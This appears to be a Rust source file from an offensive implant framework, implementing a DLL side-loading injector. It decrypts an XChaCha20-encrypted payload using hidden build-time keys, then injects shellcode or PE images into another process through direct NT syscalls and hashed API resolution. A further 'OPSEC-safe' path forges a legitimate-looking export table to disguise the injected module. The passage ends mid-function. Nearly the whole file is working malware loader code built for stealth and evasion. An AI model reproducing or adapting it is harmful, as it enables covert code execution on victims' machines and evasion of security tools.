/// DLL side-loading injection (S-05) — encrypted payload loader.
///
/// Accepts an XChaCha20-Poly1305 encrypted payload blob, decrypts it using
/// a key derived from a build-time constant (embedded via `string_crypt::enc_str!`),
/// and injects the payload into a remote process using direct NT syscalls.
///
/// **Injection flow:**
///   1. Derive the decryption key from a build-time seed via `enc_str!`.
///   2. Decrypt the outer XChaCha20-Poly1305 layer → plaintext shellcode or PE.
///   3. Open the target process via `NtOpenProcess`.
///   4. Allocate RW- memory via `NtAllocateVirtualMemory`.
///   5. Write the payload via `NtWriteVirtualMemory`.
///   6. Change protection to R-X via `NtProtectVirtualMemory`.
///   7. Flush the instruction cache.
///   8. Execute via `NtCreateThreadEx`.
///
/// **PE payloads** fall back to process hollowing (`hollowing::inject_into_process`),
/// which handles the more complex PE relocation and mapping internally.
///
/// **Encrypted payload blob format (input):**
///   `[24-byte XChaCha20 nonce][16-byte Poly1305 tag][ciphertext]`
///
/// **Key derivation:**
///   The 32-byte XChaCha20-Poly1305 key is derived from a build-time seed
///   using HKDF-SHA256 (RFC 5869).  The build-time IKM and salt are both
///   embedded via `string_crypt::enc_str!` so neither appears in the binary.
///
/// **Export forwarding / DLL generation:**
///   The `ExportConfig` struct is provided for build-time DLL generation tools
///   (e.g., `orchestra-side-load-gen`) that produce side-loaded DLLs with
///   legitimate-looking export tables.  At runtime, the injector writes
///   the decrypted payload directly into the target process without touching
///   disk.
///
/// **Multi-architecture:**
///   The injector itself is architecture-independent (it uses indirect syscalls
///   resolved at runtime).  The injected payload must match the target process
///   architecture (x86 or x64).
#[cfg(any(windows, test))]
use anyhow::{anyhow, Result};

pub struct DllSideLoadInjector;

// Re-export ExportConfig from common so callers don't need to depend on
// common directly.  The struct is defined in common because it is used in
// the Command enum variant (InjectSideLoad).
pub use common::ExportConfig;

// ── Key derivation (HKDF-SHA256, RFC 5869) ──────────────────────────────────
//
// Derives cryptographic keys from a build-time seed using HKDF-SHA256.
// The seed (IKM) is embedded via `string_crypt::enc_str!` and a compile-time
// salt is generated via `string_crypt::enc_str!` as well, so neither appears
// as a plain string in the binary.

/// Build-time salt for HKDF Extract phase.  Embedded via `string_crypt::enc_str!`
/// so the salt is not visible as a plain string in the binary.
const HKDF_SALT_ENC: &[u8] = &string_crypt::enc_str!("SYS_HKDF_SALT");

/// Perform HKDF-SHA256 Extract-then-Expand (RFC 5869).
///
/// * `ikm`  – Input Keying Material (the master key / seed).
/// * `salt` – Salt for the Extract phase.
/// * `info` – Context / application-specific information for Expand.
/// * `out_len` – Number of output keying material bytes to produce.
///
/// Returns `out_len` bytes of OKM, or panics if `out_len > 255 * 32`.
fn hkdf_sha256_derive(ikm: &[u8], salt: &[u8], info: &[u8], out_len: usize) -> Vec<u8> {
    use hmac::{Hmac, KeyInit, Mac};
    use sha2::Sha256;
    type HmacSha256 = Hmac<Sha256>;

    assert!(
        out_len <= 255 * 32,
        "HKDF-SHA256 output too large: {out_len} > 8160"
    );

    // ── Extract: PRK = HMAC-SHA256(salt, IKM) ────────────────────────────
    let mut mac = HmacSha256::new_from_slice(salt).expect("HMAC-SHA256 accepts any key length");
    mac.update(ikm);
    let prk = mac.finalize().into_bytes();

    // ── Expand: T(1) = HMAC-SHA256(PRK, info || 0x01) ────────────────────
    //             T(n) = HMAC-SHA256(PRK, T(n-1) || info || n)
    //             OKM  = T(1) || T(2) || …  (truncated to out_len)
    let mut okm = Vec::with_capacity(out_len);
    let mut t_prev = Vec::<u8>::new();
    let mut counter: u8 = 0;

    while okm.len() < out_len {
        counter = counter
            .checked_add(1)
            .expect("HKDF expand counter overflow");
        let mut mac = HmacSha256::new_from_slice(&prk).expect("HMAC-SHA256 accepts any key length");
        mac.update(&t_prev);
        mac.update(info);
        mac.update(&[counter]);
        t_prev = mac.finalize().into_bytes().to_vec();
        okm.extend_from_slice(&t_prev);
    }
    okm.truncate(out_len);
    okm
}

/// Derive the 32-byte payload decryption key from the build-time seed.
#[cfg(any(windows, test))]
fn derive_payload_key() -> [u8; 32] {
    // Build-time IKM — encrypted at compile time by string_crypt.
    let ikm = string_crypt::enc_str!("SYS_PAYLOAD_KEY_SEED");
    let okm = hkdf_sha256_derive(&ikm, HKDF_SALT_ENC, common::hkdf_info::DLL_SIDELOAD_AES, 32);
    let mut key = [0u8; 32];
    key.copy_from_slice(&okm[..32]);
    key
}

/// Derive a 16-byte RC4 key (used for re-encryption in the stub data block).
#[cfg(test)]
fn derive_stub_rc4_key() -> [u8; 16] {
    let ikm = string_crypt::enc_str!("SYS_PAYLOAD_KEY_SEED");
    let okm = hkdf_sha256_derive(&ikm, HKDF_SALT_ENC, common::hkdf_info::DLL_SIDELOAD_RC4, 32);
    let mut key = [0u8; 16];
    key.copy_from_slice(&okm[..16]);
    key
}

// ── XChaCha20-Poly1305 decryption ─────────────────────────────────────────────

/// Decrypt an XChaCha20-Poly1305 encrypted payload blob.
///
/// Input format: `[24-byte nonce][16-byte tag][ciphertext]`
#[cfg(any(windows, test))]
fn decrypt_xchacha20_payload(encrypted_blob: &[u8], key: &[u8; 32]) -> Result<Vec<u8>> {
    use chacha20poly1305::{
        aead::{Aead, KeyInit},
        XChaCha20Poly1305, XNonce,
    };
    if encrypted_blob.len() < 40 {
        return Err(anyhow!(
            "encrypted blob too short (need ≥40 bytes for nonce+tag, got {})",
            encrypted_blob.len()
        ));
    }
    let nonce = XNonce::from_slice(&encrypted_blob[..24]);
    let ciphertext_with_tag = &encrypted_blob[24..];
    let cipher = XChaCha20Poly1305::new(key.into());
    cipher
        .decrypt(nonce, ciphertext_with_tag)
        .map_err(|e| anyhow!("XChaCha20-Poly1305 decryption failed: {e}"))
}

// ── RC4 with 3072-byte initial drop ──────────────────────────────────────────
// Same algorithm as string_crypt method 1, used for build-time re-encryption
// of the payload when embedding in a side-loaded DLL.

struct Rc4State {
    s: [u8; 256],
    i: usize,
    j: usize,
}

impl Rc4State {
    fn new(key: &[u8]) -> Self {
        let mut s = [0u8; 256];
        for (i, b) in s.iter_mut().enumerate() {
            *b = i as u8;
        }
        let mut j: usize = 0;
        for i in 0..=255 {
            j = (j
                .wrapping_add(s[i] as usize)
                .wrapping_add(key[i % key.len()] as usize))
                % 256;
            s.swap(i, j);
        }
        let mut state = Rc4State { s, i: 0, j: 0 };
        // 3072-byte initial drop to mitigate known biases (same as string_crypt).
        let mut discard = [0u8; 3072];
        state.process_in_place(&mut discard);
        state
    }

    fn process_in_place(&mut self, data: &mut [u8]) {
        for b in data.iter_mut() {
            self.i = (self.i.wrapping_add(1)) % 256;
            self.j = (self.j.wrapping_add(self.s[self.i] as usize)) % 256;
            self.s.swap(self.i, self.j);
            let k = self.s[(self.s[self.i] as usize).wrapping_add(self.s[self.j] as usize) % 256];
            *b ^= k;
        }
    }
}

/// RC4 encrypt/decrypt (symmetric operation).
#[cfg(test)]
fn rc4_encrypt(plaintext: &[u8], key: &[u8]) -> Vec<u8> {
    let mut ct = plaintext.to_vec();
    Rc4State::new(key).process_in_place(&mut ct);
    ct
}

// ══════════════════════════════════════════════════════════════════════════════
//  WINDOWS IMPLEMENTATION
// ══════════════════════════════════════════════════════════════════════════════

#[cfg(windows)]
impl crate::injection::Injector for DllSideLoadInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        use crate::injection::payload_has_valid_pe_headers;
        use crate::win_types::PAGE_READWRITE;
        use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
        const SYNCHRONIZE: u32 = 0x00100000;
        use windows_sys::Win32::System::Threading::{
            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
            PROCESS_VM_READ, PROCESS_VM_WRITE,
        };

        // ── 1. Derive the decryption key from the build-time seed ──────────
        let key = derive_payload_key();

        // ── 2. Decrypt the XChaCha20-Poly1305 outer layer ──────────────────
        let plaintext = decrypt_xchacha20_payload(payload, &key)?;

        // ── 3. Validate PE headers on the *decrypted* payload ──────────────
        //
        // This check MUST run after decryption; checking the ciphertext would
        // always fail (it's encrypted noise).
        let is_pe = payload_has_valid_pe_headers(&plaintext);

        if is_pe {
            return hollowing::inject_into_process(pid, &plaintext)
                .map_err(|e| anyhow!("DllSideLoad: in-memory PE injection failed: {e}"));
        }

        // ── 4. Open target process via NtOpenProcess ───────────────────────
        let mut client_id = [0u64; 2];
        client_id[0] = pid as u64;
        let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
        obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;

        let mut h_proc: usize = 0;
        let access_mask = (PROCESS_VM_OPERATION
            | PROCESS_VM_WRITE
            | PROCESS_VM_READ
            | PROCESS_CREATE_THREAD
            | PROCESS_QUERY_INFORMATION) as u64;
        let open_status = unsafe {
            crate::syscall!(
                "NtOpenProcess",
                &mut h_proc as *mut _ as u64,
                access_mask,
                &mut obj_attr as *mut _ as u64,
                client_id.as_mut_ptr() as u64,
            )
        };
        match open_status {
            Ok(s) if s >= 0 && h_proc != 0 => {}
            _ => return Err(anyhow!("DllSideLoad: NtOpenProcess(pid={pid}) failed")),
        }
        let h_proc = h_proc as *mut std::ffi::c_void;

        macro_rules! close_h {
            ($h:expr) => {
                crate::syscall!("NtClose", $h as u64).ok();
            };
        }
        macro_rules! cleanup_and_err {
            ($msg:expr) => {{
                close_h!(h_proc);
                return Err(anyhow!($msg));
            }};
        }

        // ── 5. Resolve NtCreateThreadEx via PEB walk ──────────────────────
        let ntdll_base =
            unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")) }
                .ok_or_else(|| {
                    close_h!(h_proc);
                    anyhow!("ntdll not found")
                })?;

        let ntcreate_addr = unsafe {
            pe_resolve::get_proc_address_by_hash(
                ntdll_base,
                pe_resolve::hash_str(b"NtCreateThreadEx\0"),
            )
        }
        .ok_or_else(|| {
            close_h!(h_proc);
            anyhow!("NtCreateThreadEx not found")
        })?;

        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut *mut std::os::raw::c_void,
            u32,
            *mut std::os::raw::c_void,
            *mut std::os::raw::c_void,
            *mut std::os::raw::c_void,
            *mut std::os::raw::c_void,
            u32,
            usize,
            usize,
            usize,
            *mut std::os::raw::c_void,
        ) -> i32;
        let nt_create_thread: NtCreateThreadExFn = unsafe { std::mem::transmute(ntcreate_addr) };

        // ── 6. Allocate RW- memory in the target process ──────────────────
        let mut remote_payload: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut alloc_size = plaintext.len();
        let s = crate::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut remote_payload as *mut _ as u64,
            0u64,
            &mut alloc_size as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64,
            PAGE_READWRITE as u64,
        );
        if let Ok(st) = s {
            if st < 0 || remote_payload.is_null() {
                cleanup_and_err!(
                    "DllSideLoad: NtAllocateVirtualMemory for shellcode payload failed"
                );
            }
        } else {
            cleanup_and_err!("DllSideLoad: NtAllocateVirtualMemory for shellcode payload failed");
        }

        // ── 7. Write the decrypted payload ────────────────────────────────
        let mut written = 0usize;
        let write_ok = match crate::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            remote_payload as u64,
            plaintext.as_ptr() as u64,
            plaintext.len() as u64,
            &mut written as *mut _ as u64,
        ) {
            Ok(s) => s >= 0 && written == plaintext.len(),
            Err(_) => false,
        };
        if !write_ok {
            let mut free_base = remote_payload as usize;
            let mut free_size = 0usize;
            crate::syscall!(
                "NtFreeVirtualMemory",
                h_proc as u64,
                &mut free_base as *mut _ as u64,
                &mut free_size as *mut _ as u64,
                0x8000u64,
            )
            .ok();
            cleanup_and_err!("DllSideLoad: NtWriteVirtualMemory for shellcode failed");
        }

        // ── 8. Change protection to R-X ───────────────────────────────────
        let mut old_protect = 0u32;
        let mut prot_base = remote_payload as usize;
        let mut prot_size = plaintext.len();
        let protect_ok = match crate::syscall!(
            "NtProtectVirtualMemory",
            h_proc as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            PAGE_EXECUTE_READ as u64,
            &mut old_protect as *mut _ as u64,
        ) {
            Ok(s) => s >= 0,
            Err(_) => false,
        };
        if !protect_ok {
            let mut free_base = remote_payload as usize;
            let mut free_size = 0usize;
            crate::syscall!(
                "NtFreeVirtualMemory",
                h_proc as u64,
                &mut free_base as *mut _ as u64,
                &mut free_size as *mut _ as u64,
                0x8000u64,
            )
            .ok();
            cleanup_and_err!("DllSideLoad: NtProtectVirtualMemory to RX failed");
        }

        // ── 9. Flush instruction cache ────────────────────────────────────
        crate::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            remote_payload as u64,
            plaintext.len() as u64,
        )
        .ok();

        // ── 10. Execute via NtCreateThreadEx ───────────────────────────────
        let mut h_thread: *mut std::os::raw::c_void = std::ptr::null_mut();
        let status = unsafe {
            nt_create_thread(
                &mut h_thread,
                SYNCHRONIZE,
                std::ptr::null_mut(),
                h_proc,
                remote_payload,
                std::ptr::null_mut(),
                0,
                0,
                0,
                0,
                std::ptr::null_mut(),
            )
        };
        if status < 0 || h_thread.is_null() {
            let mut free_base = remote_payload as usize;
            let mut free_size = 0usize;
            crate::syscall!(
                "NtFreeVirtualMemory",
                h_proc as u64,
                &mut free_base as *mut _ as u64,
                &mut free_size as *mut _ as u64,
                0x8000u64,
            )
            .ok();
            cleanup_and_err!("DllSideLoad: NtCreateThreadEx for shellcode failed: {status:#x}");
        }

        close_h!(h_thread);
        close_h!(h_proc);

        tracing::info!(
            pid,
            size = plaintext.len(),
            "DllSideLoad: decrypted payload injected in-memory via XChaCha20 + NT syscalls"
        );
        Ok(())
    }
}

// ══════════════════════════════════════════════════════════════════════════════
//  EXPORT-FORWARDING INJECTION PATH (runtime, Windows only)
// ══════════════════════════════════════════════════════════════════════════════

#[cfg(windows)]
impl DllSideLoadInjector {
    /// DLL side-load injection with export forwarding.
    ///
    /// This is a more OPSEC-safe injection path than the basic [`Injector::inject`]
    /// method.  It produces a side-loaded DLL with a legitimate export table in
    /// memory by:
    ///
    /// 1. Decrypting the payload (same XChaCha20-Poly1305 layer as `inject`).
    /// 2. Opening the target process via `NtOpenProcess`.
    /// 3. Resolving the forward target DLL (e.g. `version.dll`) in the target
    ///    process via PEB module walk (`pe_resolve`).
    /// 4. Allocating memory for the payload near the forward target base address.
    /// 5. Writing the decrypted payload.
    /// 6. For each export in `named_exports` / `ordinal_exports`, patching the
    ///    payload's export table entries to point to the forward target's real
    ///    function addresses (resolved via `pe_resolve` from the loaded DLL).
    /// 7. Executing via `NtCreateThreadEx`.
    ///
    /// The existing `inject` method remains unchanged — this adds a new path.
    pub fn inject_with_export_forwarding(
        &self,
        pid: u32,
        payload: &[u8],
        export_config: &ExportConfig,
    ) -> Result<()> {
        const SYNCHRONIZE: u32 = 0x00100000;
        use crate::win_types::PAGE_READWRITE;
        use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
        use windows_sys::Win32::System::Threading::{
            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
            PROCESS_VM_READ, PROCESS_VM_WRITE,
        };

        // ── 1. Derive key and decrypt payload ─────────────────────────────
        let key = derive_payload_key();
        let plaintext = decrypt_xchacha20_payload(payload, &key)?;

        // ── 2. Open target process via NtOpenProcess ──────────────────────
        let mut client_id = [0u64; 2];
        client_id[0] = pid as u64;
        let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
        obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;

        let mut h_proc: usize = 0;
        let access_mask = (PROCESS_VM_OPERATION
            | PROCESS_VM_WRITE
            | PROCESS_VM_READ
            | PROCESS_CREATE_THREAD
            | PROCESS_QUERY_INFORMATION) as u64;
        let open_status = unsafe {
            crate::syscall!(
                "NtOpenProcess",
                &mut h_proc as *mut _ as u64,
                access_mask,
                &mut obj_attr as *mut _ as u64,
                client_id.as_mut_ptr() as u64,
            )
        };
        match open_status {
            Ok(s) if s >= 0 && h_proc != 0 => {}
            _ => return Err(anyhow!("InjectSideLoad: NtOpenProcess(pid={pid}) failed")),
        }
        let h_proc = h_proc as *mut std::ffi::c_void;

        macro_rules! close_h {
            ($h:expr) => {
                crate::syscall!("NtClose", $h as u64).ok();
            };
        }
        macro_rules! cleanup_and_err {
            ($msg:expr) => {{
                close_h!(h_proc);
                return Err(anyhow!($msg));
            }};
        }

        // ── 3. Resolve forward target DLL in target process via PEB walk ─
        //
        // We resolve the forward target DLL (e.g. "version.dll") by hashing
        // its name and walking the PEB's loaded-module list.  This gives us
        // the base address of the real DLL in the target process.
        let forward_target_bytes = format!("{}\0", export_config.forward_target);
        let forward_base = match unsafe {
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(
                forward_target_bytes.as_bytes(),
            ))
        } {
            Some(base) => base,
            None => {
                cleanup_and_err!(format!(
                    "InjectSideLoad: forward target '{}' not found in PEB",
                    export_config.forward_target
                ));
            }
        };

        // ── 4. Resolve real export addresses from the forward target ──────
        //
        // For each named export and ordinal export in the config, resolve the
        // actual function address from the loaded DLL.  These addresses will
        // be written into the payload's export table so that the injected DLL
        // forwards calls to the legitimate implementation.
        let mut forward_addresses: std::collections::HashMap<String, usize> =
            std::collections::HashMap::new();

        for name in &export_config.named_exports {
            let name_bytes = format!("{}\0", name);
            let addr = unsafe {
                pe_resolve::get_proc_address_by_hash(
                    forward_base,
                    pe_resolve::hash_str(name_bytes.as_bytes()),
                )
            };
            if let Some(a) = addr {
                forward_addresses.insert(name.clone(), a);
            } else {
                tracing::warn!(
                    "InjectSideLoad: could not resolve export '{}' from '{}'",
                    name,
                    export_config.forward_target
                );
            }
        }

        for (ordinal, internal_name) in &export_config.ordinal_exports {
            let name_bytes = format!("{}\0", internal_name);
            let addr = unsafe {
                pe_resolve::get_proc_address_by_hash(
                    forward_base,
                    pe_resolve::hash_str(name_bytes.as_bytes()),
                )
            };
            if let Some(a) = addr {
                forward_addresses.insert(internal_name.clone(), a);
            } else {
                tracing::warn!(
                    "InjectSideLoad: could not resolve ordinal {} export '{}' from '{}'",
                    ordinal,
                    internal_name,
                    export_config.forward_target
                );
            }
        }

        // ── 5. Allocate RW- memory near the forward target base ───────────
        //
        // Allocate in the same region as the forward target so that the
        // injected module appears to be part of the same DLL neighborhood
        // in the process address space.
        let mut remote_payload: *mut std::ffi::c_void =
            (forward_base + 0x10000) as *mut std::ffi::c_void; // hint address
        let mut alloc_size = plaintext.len();
        let s = crate::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut remote_payload as *mut _ as u64,
            0u64,
            &mut alloc_size as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64,
            PAGE_READWRITE as u64,
        );
        if let Ok(st) = s {
            if st < 0 || remote_payload.is_null() {
                cleanup_and_err!(
                    "InjectSideLoad: NtAllocateVirtualMemory near forward target failed"
                );
            }
        } else {
            cleanup_and_err!("InjectSideLoad: NtAllocateVirtualMemory near forward target failed")
        }

        // ── 6. Write the decrypted payload ────────────────────────────────
        let mut written = 0usize;
        let write_ok = match crate::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            remote_payload as u64,
            plaintext.as_ptr() as u64,
            plaintext.len() as u64,
            &mut written as *mut _ as u64,
        ) {
            Ok(s) => s >= 0 && written == plaintext.len(),
            Err(_) => false,
        };
        if !write_ok {
            let mut free_base = remote_payload as usize;
            let mut free_size = 0usize;
            crate::syscall!(
                "NtFreeVirtualMemory",
                h_proc as u64,
                &mut free_base as *mut _ as u64,
                &mut free_size as *mut _ as u64,
                0x8000u64,
            )
            .ok();
            cleanup_and_err!("InjectSideLoad: NtWriteVirtualMemory failed");
        }

        // ── 7. Patch export table entries in the written payload ──────────
        //
        // Scan the PE export directory of the written payload and overwrite
        // each export's RVAs with the absolute addresses of the forward
        // target's real functions.  This creates a DLL in memory whose
        // export table points to legitimate implementations.
        if !forward_addresses.is_empty() {
            if let Err(e) = unsafe {
                patch_export_table(
                    remote_payload as usize,
                    &plaintext,
                    h_proc,
                    &forward_addresses,
                    &export_config.named_exports,
                    &export_config.ordinal_exports,
                )
            } {
                tracing::warn!("InjectSideLoad: export table patching failed: {e}");
                // Non-fatal — the payload still executes, it just won't have
                // a legitimate export table.
            }
        }

        // ── 8. Change protection to R-X ───────────────────────────────────
        let mut old_protect = 0u32;
        let mut prot_base = remote_payload as usize;
        let mut prot_size = plaintext.len();
        let protect_ok = match crate::syscall!(
            "NtProtectVirtualMemory",
            h_proc as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            PAGE_EXECUTE_READ as u64,
            &mut old_protect as *mut _ as u64,
        ) {
            Ok(s) => s >= 0,
            Err(_) => false,
        };
        if !protect_ok {
            let mut free_base = remote_payload as usize;
            let mut free_size = 0usize;
            crate::syscall!(
                "NtFreeVirtualMemory",
                h_proc as u64,
                &mut free_base as *mut _ as u64,
                &mut free_size as *mut _ as u64,
                0x8000u64,
            )
            .ok();
            cleanup_and_err!("InjectSideLoad: NtProtectVirtualMemory to RX failed");
        }

        // ── 9. Flush instruction cache ────────────────────────────────────
        crate::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            remote_payload as u64,
            plaintext.len() as u64,
        )
        .ok();

        // ── 10. Resolve NtCreateThreadEx ──────────────────────────────────
        let ntdll_base =
            unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")) }
                .ok_or_else(|| {
                    close_h!(h_proc);
                    anyhow!("ntdll not found")
                })?;

        let ntcreate_addr = unsafe {
            pe_resolve::get_proc_address_by_hash(
                ntdll_base,
                pe_resolve::hash_str(b"NtCreateThreadEx\0"),
            )
        }
        .ok_or_else(|| {
            close_h!(h_proc);
            anyhow!("NtCreateThreadEx not found")
        })?;

        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut *mut std::os::raw::c_void,
            u32,
            *mut std::os::raw::c_void,
            *mut std::os::raw::c_void,
            *mut std::os::raw::c_void,
            *mut std::os::raw::c_void,
            u32,
            usize,
            usize,
            usize,
            *mut std::os::raw::c_void,
        ) -> i32;
        let nt_create_thread: NtCreateThreadExFn = unsafe { std::mem::transmute(ntcreate_addr) };

        // ── 11. Execute via NtCreateThreadEx ──────────────────────────────
        let mut h_thread: *mut std::os::raw::c_void = std::ptr::null_mut();
        let status = unsafe {
            nt_create_thread(
                &mut h_thread,
                SYNCHRONIZE,
                std::ptr::null_mut(),
                h_proc,
                remote_payload,
                std::ptr::null_mut(),
                0,
                0,
                0,
                0,
                std::ptr::null_mut(),
            )
        };
        if status < 0 || h_thread.is_null() {
            let mut free_base = remote_payload as usize;
            let mut free_size = 0usize;
            crate::syscall!(
                "NtFreeVirtualMemory",
                h_proc as u64,
                &mut free_base as *mut _ as u64,
                &mut free_size as *mut _ as u64,
                0x8000u64,
            )
            .ok();
            cleanup_and_err!("InjectSideLoad: NtCreateThreadEx failed: {status:#x}");
        }

        close_h!(h_thread);
        close_h!(h_proc);

        tracing::info!(
            pid,
            size = plaintext.len(),
            forward_target = %export_config.forward_target,
            named_exports = export_config.named_exports.len(),
            ordinal_exports = export_config.ordinal_exports.len(),
            "InjectSideLoad: decrypted payload injected with export forwarding via XChaCha20 + NT syscalls"
        );
        Ok(())
    }
}

/// Patch the export table of a PE payload that has been written to a remote
/// process, replacing export RVAs with the absolute addresses of the forward
/// target's real functions.
///
/// # Safety
///
/// `remote_base` must be a valid allocation in `h_proc` containing a valid PE
/// image.  `local_copy` must be the same bytes that were written to `remote_base`.
#[cfg(windows)]
unsafe fn patch_export_table(
    remote_base: usize,
    local_copy: &[u8],
    h_proc: *mut std::ffi::c_void,
    forward_addresses: &std::collections::HashMap<String, usize>,
    named_exports: &[String],
    ordinal_exports: &[(u16, String)],
) -> Result<()> {
    // ── Parse the PE export directory from the local copy ──────────────
    if local_copy.len() < 0x40 {
        return Err(anyhow!("payload too small for PE headers"));
    }
    if &local_copy[0..2] != b"MZ" {
        return Err(anyhow!("payload is not a valid PE (missing MZ signature)"));
    }

    let e_lfanew = u32::from_le_bytes([
        local_copy[0x3c],
        local_copy[0x3d],
        local_copy[0x3e],
        local_copy[0x3f],
    ]) as usize;

    if e_lfanew + 0x78 > local_copy.len() {
        return Err(anyhow!(
            "PE headers truncated (cannot reach optional header)"
        ));
    }

    // Optional header offset = e_lfanew + 4 (sig) + 20 (COFF header)
    let opt_hdr_off = e_lfanew + 4 + 20;

    // Data directory index 0 = Export Directory
    let export_dir_rva = u32::from_le_bytes([
        local_copy[opt_hdr_off + 96],
        local_copy[opt_hdr_off + 97],
        local_copy[opt_hdr_off + 98],
        local_copy[opt_hdr_off + 99],
    ]) as usize;
    let export_dir_size = u32::from_le_bytes([
        local_copy[opt_hdr_off + 100],
        local_copy[opt_hdr_off + 101],
        local_copy[opt_hdr_off + 102],
        local_copy[opt_hdr_off + 103],
    ]) as usize;

    if export_dir_rva == 0 || export_dir_size == 0 {
        // No export directory — nothing to patch.
        return Ok(());
    }

    // Read the export directory from the remote process.
    let mut export_dir_buf = vec![0u8; export_dir_size];
    let mut bytes_read = 0usize;
    let read_ok = match crate::syscall!(
        "NtReadVirtualMemory",
        h_proc as u64,
        (remote_base + export_dir_rva) as u64,
        export_dir_buf.as_mut_ptr() as u64,
        export_dir_size as u64,
        &mut bytes_read as *mut _ as u64,
    ) {
        Ok(s) => s >= 0,
        Err(_) => false,
    };
    if !read_ok || bytes_read < 40 {
        return Err(anyhow!(
            "failed to read export directory from remote process"
        ));
    }

    // Parse the export directory structure (IMAGE_EXPORT_DIRECTORY):
    //   +0x18: NumberOfNames
    //   +0x20: AddressOfNames (RVA)
    //   +0x24: AddressOfNameOrdinals (RVA)
    //   +0x1c: NumberOfFunctions
    //   +0x28: AddressOfFunctions (RVA)
    let num_names = u32::from_le_bytes([
        export_dir_buf[0x18],
        export_dir_buf[0x19],
        export_dir_buf[0x1a],
        export_dir_buf[0x1b],
    ]) as usize;
    let addr_of_names_rva = u32::from_le_bytes([
        export_dir_buf[0x20],
        export_dir_buf[0x21],
        export_dir_buf[0x22],
        export_dir_buf[0x23],
    ]) as usize;
    let addr_of_ordinals_rva = u32::from_le_bytes([
        export_dir_buf[0x24],
        export_dir_buf[0x25],
        export_dir_buf[0x26],
        export_dir_buf[0x27],
    ]) as usize;
    let addr_of_functions_rva = u32::from_le_bytes([
        export_dir_buf[0x28],
        export_dir_buf[0x29],
        export_dir_buf[0x2a],
        export_dir_buf[0x2b],
    ]) as usize;

    if num_names == 0 || addr_of_names_rva == 0 || addr_of_functions_rva == 0 {
        return Ok(()); // Empty export table — nothing to patch.
    }

    // Build a set of export names to patch with their forward addresses.
    let mut patch_targets: std::collections::HashMap<String, usize> =
        std::collections::HashMap::new();
    for name in named_exports {
        if let Some(&addr) = forward_addresses.get(name) {
            patch_targets.insert(name.to_lowercase(), addr);
        }
    }
    for (_ordinal, internal_name) in ordinal_exports {
        if let Some(&addr) = forward_addresses.get(internal_name) {
            patch_targets.insert(internal_name.to_lowercase(), addr);
        }
    }

    if patch_targets.is_empty() {
        return Ok(()); // No resolvable exports — nothing to patch.
    }

    // ── Walk the export name table and patch matching entries ───────────
    //
    // For each named export in the PE, read its name, check if it matches
    // one of our forward targets, and if so, overwrite the corresponding
    // function RVA with the absolute address of the forward target's real
    // implementation.
    let mut patched = 0usize;
    for i in 0..num_names {
        // Read the name RVA
        let name_rva_offset = addr_of_names_rva + i * 4;
        let name_rva_remote = remote_base + name_rva_offset;
        let mut name_rva_buf = [0u8; 4];
        let mut br = 0usize;
        let ok = match crate::syscall!(
            "NtReadVirtualMemory",
            h_proc as u64,
            name_rva_remote as u64,
            name_rva_buf.as_mut_ptr() as u64,
            4u64,
            &mut br as *mut _ as u64,
        ) {
            Ok(s) => s >= 0 && br == 4,
            Err(_) => false,
        };
        if !ok {
            continue;
        }
        let export_name_rva = u32::from_le_bytes(name_rva_buf) as usize;
        if export_name_rva == 0 {
            continue;
        }

        // Read the export name (up to 256 bytes, NUL-terminated)
        let export_name_remote = remote_base + export_name_rva;
        let mut name_buf = [0u8; 256];
        let mut br = 0usize;
        let ok = match crate::syscall!(
            "NtReadVirtualMemory",
            h_proc as u64,
            export_name_remote as u64,
            name_buf.as_mut_ptr() as u64,
            256u64,
            &mut br as *mut _ as u64,
        ) {
            Ok(s) => s >= 0,
            Err(_) => false,
        };
        if !ok {
            continue;
        }

        // Find NUL terminator
        let name_len = name_buf.iter().position(|&b| b == 0).unwrap_or(256);
        let export_name = String::from_utf8_lossy(&name_buf[..name_len]).to_string();

        // Check if this export name matches one of our forward targets
        if let Some(&forward_addr) = patch_targets.get(&export_name.to_lowercase()) {
            // Read the ordinal index for this name
            let ordinal_offset = addr_of_ordinals_rva + i * 2;
            let mut ordinal_buf = [0u8; 2];
            let mut br2 = 0usize;
            let ok = match crate::syscall!(
                "NtReadVirtualMemory",
                h_proc as u64,
                (remote_base + ordinal_offset) as u64,
                ordinal_buf.as_mut_ptr() as u64,
                2u64,
                &mut br2 as *mut _ as u64,
            ) {
                Ok(s) => s >= 0 && br2 == 2,
                Err(_) => false,
            };
            if !ok {
                continue;
            }
            let ordinal = u16::from_le_bytes(ordinal_buf) as usize;

            // Compute the function RVA slot and overwrite it with the
            // forward target's absolute address.
            let func_rva_slot = remote_base + addr_of_functions_rva + ordinal * 4;
            let new_rva_bytes = (forward_addr - remote_base).to_le_bytes();
            let mut bw = 0usize;
            match crate::syscall!(
                "NtWriteVirtualMemory",
